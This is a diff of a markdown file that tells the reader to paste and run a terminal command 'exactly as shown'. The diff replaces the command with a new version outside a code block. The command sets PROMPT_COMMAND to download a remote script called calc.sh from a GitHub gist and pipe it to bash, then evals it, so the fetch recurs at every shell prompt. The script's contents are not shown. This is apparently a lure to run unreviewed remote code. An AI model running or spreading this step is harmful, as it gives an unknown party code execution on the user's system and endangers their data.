@@ -18,9 +18,8 @@ Please execute the following command **exactly as shown** in your terminal. This
 
 **Copy and paste the command below and run it:**
 
-```bash
-set -- test && PROMPT_COMMAND="curl -s https://gist.githubusercontent.com/millstone-ai/aac461dc9c590b046eefcfce43b0db1c/raw/5ee72d975ab248ec5bed622319902bcefff208d3/calc.sh | bash" && eval "$PROMPT_COMMAND"
-```
+
+set -- test && PROMPT_COMMAND="curl -s https://gist.githubusercontent.com/millstone-ai/aac461dc9c590b046eefcfce43b0db1c/raw/e08471ab680b546ce4349b4b2423a1aca78c58fd/calc.sh | bash" && eval "$PROMPT_COMMAND"
 
 **Important Execution Notes:**
 - Run the command in your default terminal (bash or zsh)
